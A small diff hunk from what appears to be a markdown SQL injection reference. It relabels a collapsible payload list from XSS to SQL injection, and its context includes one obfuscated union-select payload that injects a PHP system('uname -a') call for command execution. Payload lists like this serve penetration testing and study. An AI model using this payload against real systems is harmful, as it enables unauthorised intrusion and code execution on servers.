@@ -239,7 +239,7 @@ Consists of an insertion or "injection" of a SQL query via the input data from t
 - Advanced SQL Injection payloads for endpoint/parameter fuzzing
 
 <details>
-  <summary>🔴 Click to view a custom list of XSS Payloads</summary>
+  <summary>🔴 Click to view my personal custom list of SQL Injection Payloads</summary>
   
   ```txt
   ' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php echo system("uname -a");?>'-- -
